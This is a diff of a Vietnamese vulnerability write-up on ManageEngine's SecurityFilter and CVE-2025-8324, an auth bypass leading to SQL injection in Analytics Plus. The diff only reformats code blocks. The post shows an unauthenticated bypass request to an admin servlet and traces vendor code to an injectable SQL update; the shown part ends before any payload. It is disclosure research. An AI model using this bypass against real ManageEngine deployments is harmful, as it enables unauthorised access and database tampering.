@@ -202,32 +202,32 @@
 <p>Để giới thiệu qua thì ManageEngine là bộ sản phẩm IT management được nhiều tổ chức doanh nghiệp tin dùng, trải dài từ IT helpdesk, AD management, cho đến network và security monitoring. Điểm đáng chú ý là do cùng chung một dòng sản phẩm nên codebase cũng có nhiều điểm tương đồng — nhiều thư viện dùng chung, pattern lặp lại.</p>
 <h2 id="securityfilter">SecurityFilter</h2>
 <p>Trải qua nhiều năm phát triển, codebase lẫn attack surface của ManageEngine lớn dần. Do đó, vào khoảng năm 2022, vendor bắt đầu bổ sung thêm class <code>SecurityFilter</code> đóng vai trò như một filter trung tâm — buộc mọi request phải đi qua đây để dễ dàng kiểm soát hơn:</p>
-<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;filter&gt;    
-    &lt;filter-name&gt;Security Filter&lt;/filter-name&gt;
-    &lt;filter-class&gt;com.adventnet.iam.security.SecurityFilter&lt;/filter-class&gt;
-
-    &lt;init-param&gt;
-        &lt;param-name&gt;config-file&lt;/param-name&gt;
-        &lt;param-value&gt;security-properties.xml,security-defaultresponseheaders.xml,__TRUNCATED__&lt;/param-value&gt;
-    &lt;/init-param&gt;
-&lt;/filter&gt;
-
-&lt;filter-mapping&gt;
-    &lt;filter-name&gt;Security Filter&lt;/filter-name&gt;
-    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
-&lt;/filter-mapping&gt;
-</code></pre><p>Mỗi request phải match với một ActionRule có sẵn — nếu không, request sẽ bị reject:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;filter&gt;</span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;filter-name&gt;</span>Security Filter<span style="color:#f92672">&lt;/filter-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;filter-class&gt;</span>com.adventnet.iam.security.SecurityFilter<span style="color:#f92672">&lt;/filter-class&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;init-param&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;param-name&gt;</span>config-file<span style="color:#f92672">&lt;/param-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;param-value&gt;</span>security-properties.xml,security-defaultresponseheaders.xml,__TRUNCATED__<span style="color:#f92672">&lt;/param-value&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/init-param&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/filter&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;filter-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;filter-name&gt;</span>Security Filter<span style="color:#f92672">&lt;/filter-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;url-pattern&gt;</span>/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/filter-mapping&gt;</span>
+</span></span></code></pre></div><p>Mỗi request phải match với một ActionRule có sẵn — nếu không, request sẽ bị reject:
 <img src="/images/2026/Auth-Bypass-Across-ManageEngine-Products/URL_RULE_NOT_CONFIGURED.png" alt="URL_RULE_NOT_CONFIGURED"></p>
 <p>Để dễ hiểu:</p>
 <pre tabindex="0"><code>Request → SecurityFilter → ActionRule match? → Servlet
                               ↓ (no match)
                            Reject 403
 </code></pre><p>Các file <code>*.xml</code> chứa ActionRule ở <code>config-file</code> sẽ được load và có dạng như sau:</p>
-<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;url path=&#34;/internalconnectorapi/connector/[a-z0-9]+/db/[0-9]+/CANCREATESETUPFORORG&#34; operation-type=&#34;read&#34; authentication=&#34;required&#34; app-roles=&#34;SUPERADMIN&#34; resource=&#34;DB&#34; resource-param=&#34;db&#34; internal=&#34;true&#34;  oauthscope=&#34;metadata&#34;&gt;
-    &lt;param name=&#34;ORGID&#34; regex=&#34;zrtext&#34; secret=&#34;true&#34; /&gt;
-    &lt;param name=&#34;ORGNAME&#34; regex=&#34;zrtext&#34; secret=&#34;true&#34; /&gt;
-&lt;/url&gt;
-</code></pre><p>Một số attributes đáng chú ý:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;url</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;/internalconnectorapi/connector/[a-z0-9]+/db/[0-9]+/CANCREATESETUPFORORG&#34;</span> <span style="color:#a6e22e">operation-type=</span><span style="color:#e6db74">&#34;read&#34;</span> <span style="color:#a6e22e">authentication=</span><span style="color:#e6db74">&#34;required&#34;</span> <span style="color:#a6e22e">app-roles=</span><span style="color:#e6db74">&#34;SUPERADMIN&#34;</span> <span style="color:#a6e22e">resource=</span><span style="color:#e6db74">&#34;DB&#34;</span> <span style="color:#a6e22e">resource-param=</span><span style="color:#e6db74">&#34;db&#34;</span> <span style="color:#a6e22e">internal=</span><span style="color:#e6db74">&#34;true&#34;</span>  <span style="color:#a6e22e">oauthscope=</span><span style="color:#e6db74">&#34;metadata&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;param</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;ORGID&#34;</span> <span style="color:#a6e22e">regex=</span><span style="color:#e6db74">&#34;zrtext&#34;</span> <span style="color:#a6e22e">secret=</span><span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;param</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;ORGNAME&#34;</span> <span style="color:#a6e22e">regex=</span><span style="color:#e6db74">&#34;zrtext&#34;</span> <span style="color:#a6e22e">secret=</span><span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/url&gt;</span>
+</span></span></code></pre></div><p>Một số attributes đáng chú ý:</p>
 <ul>
 <li><code>path</code>: path regex match với requestURI</li>
 <li><code>authentication</code>: yêu cầu xác thực hay không</li>
@@ -238,22 +238,22 @@
 <p>Ví dụ param <code>ORGNAME</code> có kiểu <code>regex</code>, value cần match pattern sau:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;regex</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;zrtext&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;[\p{L}\p{N}\p{P}\p{S}\p{C}\p{M}\p{Z}]+&#34;</span> <span style="color:#f92672">/&gt;</span>
 </span></span></code></pre></div><p>Để bypass class này khá khó khăn khi requestURI đã bị chặn kĩ các ký tự như path parameter, url encoding hay path traversal qua các block:</p>
-<pre tabindex="0"><code class="language-java!" data-lang="java!">String uri = request.getRequestURI();
-if (uri.contains(&#34;;&#34;)) {
-    logger.log(Level.SEVERE, &#34;******INVALID******* Pathparameter value is present in the request : {0}&#34;, uri);
-    throw new IAMSecurityException(&#34;URL_RULE_NOT_CONFIGURED&#34;);
-}
-
-if (this.securityFilterConfig.isDisablePathParameterURIDecodingCheck() || !uri.contains(&#34;%3b&#34;) &amp;&amp; !uri.contains(&#34;%3B&#34;)) {
-    if (DispatcherType.REQUEST.equals(request.getDispatcherType()) &amp;&amp; (uri.contains(&#34;.&#34;) || uri.contains(&#34;%2e&#34;) || uri.contains(&#34;%2E&#34;))) {
-        for(String pattern : SecurityUtil.PATH_TRAVERSAL_PATTERNS) {
-            if (uri.contains(pattern)) {
-                logger.log(Level.SEVERE, &#34;Dot Dot Slash is present in the request URI : {0}&#34;, uri);
-                throw new IAMSecurityException(&#34;URL_RULE_NOT_CONFIGURED&#34;);
-            }
-        }
-    }
-</code></pre><p>Do vậy mình chuyển hướng qua tìm các ActionRule có thể bị misconfiguration.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>String uri <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span><span style="color:#a6e22e">getRequestURI</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>uri<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;;&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    logger<span style="color:#f92672">.</span><span style="color:#a6e22e">log</span><span style="color:#f92672">(</span>Level<span style="color:#f92672">.</span><span style="color:#a6e22e">SEVERE</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;******INVALID******* Pathparameter value is present in the request : {0}&#34;</span><span style="color:#f92672">,</span> uri<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IAMSecurityException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;URL_RULE_NOT_CONFIGURED&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">securityFilterConfig</span><span style="color:#f92672">.</span><span style="color:#a6e22e">isDisablePathParameterURIDecodingCheck</span><span style="color:#f92672">()</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>uri<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%3b&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>uri<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%3B&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>DispatcherType<span style="color:#f92672">.</span><span style="color:#a6e22e">REQUEST</span><span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getDispatcherType</span><span style="color:#f92672">())</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">(</span>uri<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> uri<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%2e&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> uri<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%2E&#34;</span><span style="color:#f92672">)))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span><span style="color:#f92672">(</span>String pattern <span style="color:#f92672">:</span> SecurityUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">PATH_TRAVERSAL_PATTERNS</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>uri<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span>pattern<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                logger<span style="color:#f92672">.</span><span style="color:#a6e22e">log</span><span style="color:#f92672">(</span>Level<span style="color:#f92672">.</span><span style="color:#a6e22e">SEVERE</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Dot Dot Slash is present in the request URI : {0}&#34;</span><span style="color:#f92672">,</span> uri<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IAMSecurityException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;URL_RULE_NOT_CONFIGURED&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Do vậy mình chuyển hướng qua tìm các ActionRule có thể bị misconfiguration.</p>
 <h2 id="cve-2025-8324-analytics-plus-authentication-bypass--sql-injection">CVE-2025-8324: Analytics Plus Authentication Bypass &amp; SQL Injection</h2>
 <p>Advisory: <a href="https://www.manageengine.com/analytics-plus/CVE-2025-8324.html">https://www.manageengine.com/analytics-plus/CVE-2025-8324.html</a></p>
 <p>Tại file <code>securityxmls/ZROP/security-zrop.xml</code> có rule sau dành cho các static files:</p>
@@ -264,23 +264,23 @@ if (this.securityFilterConfig.isDisablePathParameterURIDecodingCheck() || !uri.c
 <li>cho phép truyền param tùy ý, không bị kiểm tra định dạng</li>
 </ul>
 <p>Root cause của lỗ hổng này nằm ở việc path regex trong rule không được prefix, ta có thể lợi dụng rule để match request với các servlet có wildcard mapping (thường được prefix). Ví dụ:</p>
-<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;servlet-mapping&gt;
-    &lt;servlet-name&gt;ZAAdminPageAudit&lt;/servlet-name&gt;
-    &lt;url-pattern&gt;/admintool/*&lt;/url-pattern&gt;
-&lt;/servlet-mapping&gt;
-</code></pre><p>Request chưa xác thực sau sẽ match với static files rule trên và chạm được servlet <code>ZAAdminPageAudit</code> - dẫn đến auth bypass:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-name&gt;</span>ZAAdminPageAudit<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;url-pattern&gt;</span>/admintool/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span></code></pre></div><p>Request chưa xác thực sau sẽ match với static files rule trên và chạm được servlet <code>ZAAdminPageAudit</code> - dẫn đến auth bypass:</p>
 <pre tabindex="0"><code>GET /admintool/test/a.png HTTP/1.1
 Host: &lt;host&gt;
 </code></pre><p>Analytics Plus có kha khá wildcard mapping. Ngoài việc đọc chay file <code>web.xml</code>, ta có thể dynamic debug để lấy danh sách mapping này chuẩn hơn, tránh miss các trường hợp servlet được add qua runtime.</p>
 <p>Đầu tiên, cần thêm lib <code>catalina.jar</code> của tomcat vào idea để được index.
 Sau đó, tại class <code>org.apache.catalina.mapper.Mapper</code> đặt breakpoint ở method <code>internalMapWrapper()</code> để lấy field <code>wildcardWrappers</code>, khi breakpoint hit, nhấn <code>Alt +F8</code> ở ô evaluate expression để mở rộng và chạy đoạn code sau:</p>
-<pre tabindex="0"><code class="language-java!" data-lang="java!">ArrayList&lt;&gt; results = new ArrayList&lt;&gt;();
-int b = wildcardWrappers.length;
-for (int i = 0; i &lt; b; i++) {
-    results.add(wildcardWrappers[i].object.getServletClass());
-}
-results.stream().toArray();
-</code></pre><p>Ta được danh sách gồm 53 servlet class:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ArrayList<span style="color:#f92672">&lt;&gt;</span> results <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ArrayList<span style="color:#f92672">&lt;&gt;();</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> b <span style="color:#f92672">=</span> wildcardWrappers<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> b<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    results<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span>wildcardWrappers<span style="color:#f92672">[</span>i<span style="color:#f92672">].</span><span style="color:#a6e22e">object</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getServletClass</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>results<span style="color:#f92672">.</span><span style="color:#a6e22e">stream</span><span style="color:#f92672">().</span><span style="color:#a6e22e">toArray</span><span style="color:#f92672">();</span>
+</span></span></code></pre></div><p>Ta được danh sách gồm 53 servlet class:
 <img src="/images/2026/Auth-Bypass-Across-ManageEngine-Products/Tomcat_Mapper.png" alt="Tomcat_Mapper"></p>
 <p>Sau khi phân tích, mình tìm được 1 vị trí tồn tại SQL Injection tại servlet:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;servlet&gt;</span>
@@ -292,20 +292,20 @@ results.stream().toArray();
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;url-pattern&gt;</span>/connectoradmin/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
 </span></span></code></pre></div><p>Servlet này được dùng bởi administrators để quản trị và cấu hình nhiều tác vụ. RequestURI sẽ được parse thành <code>uriParams</code> qua constructor sau:</p>
-<pre tabindex="0"><code class="language-java!" data-lang="java!">public ClientAPIRequest(HttpServletRequest request, HttpServletResponse response) {
-    super(request);
-    this.response = response;
-    String uri = request.getRequestURI().substring(1);
-    String[] uriArray = uri.split(&#34;/&#34;);
-    boolean isCustomInternal = uri.startsWith(&#34;internalconnectorapi/v2&#34;);
-    this.uriParams.put(&#34;action&#34;, uriArray[uriArray.length - 1]);
-    int sIndex = !uriArray[0].equals(&#34;reports&#34;) &amp;&amp; !isCustomInternal ? 1 : 2;
-
-    for(int i = sIndex; i &lt; uriArray.length - 1; i += 2) {
-        this.uriParams.put(uriArray[i], uriArray[i + 1]);
-    }
-}
-</code></pre><p>Do đó cần có format:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ClientAPIRequest</span><span style="color:#f92672">(</span>HttpServletRequest request<span style="color:#f92672">,</span> HttpServletResponse response<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">super</span><span style="color:#f92672">(</span>request<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> response<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    String uri <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span><span style="color:#a6e22e">getRequestURI</span><span style="color:#f92672">().</span><span style="color:#a6e22e">substring</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> uriArray <span style="color:#f92672">=</span> uri<span style="color:#f92672">.</span><span style="color:#a6e22e">split</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">boolean</span> isCustomInternal <span style="color:#f92672">=</span> uri<span style="color:#f92672">.</span><span style="color:#a6e22e">startsWith</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;internalconnectorapi/v2&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">uriParams</span><span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;action&#34;</span><span style="color:#f92672">,</span> uriArray<span style="color:#f92672">[</span>uriArray<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">]);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sIndex <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>uriArray<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">].</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;reports&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>isCustomInternal <span style="color:#f92672">?</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> sIndex<span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> uriArray<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">;</span> i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">uriParams</span><span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>uriArray<span style="color:#f92672">[</span>i<span style="color:#f92672">],</span> uriArray<span style="color:#f92672">[</span>i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">]);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Do đó cần có format:</p>
 <pre tabindex="0"><code>/connectoradmin/action/&lt;ACTION&gt;/&lt;key1&gt;/&lt;value1&gt;/&lt;key2&gt;/&lt;value2&gt;...
 </code></pre><p>Trong đó cần set key <code>conndbinfoid</code> để request về sau không bị lỗi:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getResourceValue</span><span style="color:#f92672">(</span>String resourceName<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
@@ -320,42 +320,42 @@ results.stream().toArray();
 </span></span><span style="display:flex;"><span>            APIFactoryProvider<span style="color:#f92672">.</span><span style="color:#a6e22e">getThreadLocalAPI</span><span style="color:#f92672">().</span><span style="color:#a6e22e">setThreadLocalForGeneratedId</span><span style="color:#f92672">(</span>connInfoId<span style="color:#f92672">);</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// truncated...
 </span></span></span></code></pre></div><p>Với action là <code>UPDATECONNECTORMETA</code>:</p>
-<pre tabindex="0"><code class="language-java!" data-lang="java!">if (action.equals(&#34;UPDATECONNECTORMETA&#34;)) {
-
-    JSONObject response = new JSONObject();
-    Long connModId = req.getParam(&#34;CONNMODID&#34;) != null ? Long.parseLong(req.getParam(&#34;CONNMODID&#34;)) : null;
-    Long connEntityId = req.getParam(&#34;CONNENTITYID&#34;) != null ? Long.parseLong(req.getParam(&#34;CONNENTITYID&#34;)) : null;
-    String updColum = req.getRequiredParam(&#34;COLUMN&#34;);
-    String updColumValue = req.getRequiredParam(&#34;VALUE&#34;);
-    String table = req.getRequiredParam(&#34;TABLE&#34;);
-    ZAConnConsumerUtil.updateTableValue(table, updColum, updColumValue, connInfoId, connModId, connEntityId); // [1]
-    response.put(&#34;message&#34;, &#34;Restored Successfully&#34;);
-    JSONObject connPerms = response;
-    return connPerms;
-}
-</code></pre><p>Tại [1] sẽ gọi tới <code>ZAConnConsumerUtil.updateTableValue()</code>:</p>
-<pre tabindex="0"><code class="language-java!" data-lang="java!">public static void updateTableValue(String tableName, String columnName, String columnValue, Long connInfoId, Long connModId, Long connEntitiyId) throws Exception {
-    String sql = null;
-    switch (tableName) {
-        case &#34;CustomConnectorInfo&#34;:
-            sql = SQLQueryAPI.getSQLString(&#34;ZAUpdateTableColValueForConnInfo&#34;, new Object[][]{{&#34;UPDATECOLUMN&#34;, columnName}, {&#34;UPDATEDVALUE&#34;, columnValue}, {&#34;CONNINFOID&#34;, connInfoId}});
-            break;
-        case &#34;CustomConnectorModuleInfo&#34;:
-            sql = SQLQueryAPI.getSQLString(&#34;ZAUpdateTableColValueForConnModInfo&#34;, new Object[][]{{&#34;UPDATECOLUMN&#34;, columnName}, {&#34;UPDATEDVALUE&#34;, columnValue}, {&#34;CONNINFOID&#34;, connInfoId}, {&#34;CONNMODID&#34;, connModId}});
-            break;
-        case &#34;CustomConnectorEntityInfo&#34;:
-            sql = SQLQueryAPI.getSQLString(&#34;ZAUpdateTableColValueForConnEntityInfo&#34;, new Object[][]{{&#34;UPDATECOLUMN&#34;, columnName}, {&#34;UPDATEDVALUE&#34;, columnValue}, {&#34;CONNINFOID&#34;, connInfoId}, {&#34;CONNENTITYID&#34;, connEntitiyId}});
-            break;
-        case &#34;CustomConnectorModuleStatus&#34;:
-            sql = SQLQueryAPI.getSQLString(&#34;ZAUpdateTableColValueForModuleStatus&#34;, new Object[][]{{&#34;UPDATECOLUMN&#34;, columnName}, {&#34;UPDATEDVALUE&#34;, columnValue}, {&#34;CONNMODID&#34;, connModId}, {&#34;CONNENTITYID&#34;, connEntitiyId}});
-    }
-
-    if (sql != null) {
-        SQLQueryAPI.executeUpdate(sql, new RptSQLAdapter(connInfoId != null ? connInfoId : connModId));
-    }
-
-}
-</code></pre><p><code>SQLQueryAPI.getSQLString()</code> có nhiệm vụ lấy <code>sqlString</code> được định nghĩa sẵn trong file cấu hình xml, sau đó thay thế các template variable để tạo thành câu SQL hoàn chỉnh:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>action<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;UPDATECONNECTORMETA&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    JSONObject response <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> JSONObject<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>    Long connModId <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span><span style="color:#a6e22e">getParam</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;CONNMODID&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> Long<span style="color:#f92672">.</span><span style="color:#a6e22e">parseLong</span><span style="color:#f92672">(</span>req<span style="color:#f92672">.</span><span style="color:#a6e22e">getParam</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;CONNMODID&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    Long connEntityId <span style="color:#f92672">=</span> req<span style="color:#f92672">.</span><span style="color:#a6e22e">getParam</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;CONNENTITYID&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> Long<span style="color:#f92672">.</span><span style="color:#a6e22e">parseLong</span><span style="color:#f92672">(</span>req<span style="color:#f92672">.</span><span style="color:#a6e22e">getParam</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;CONNENTITYID&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
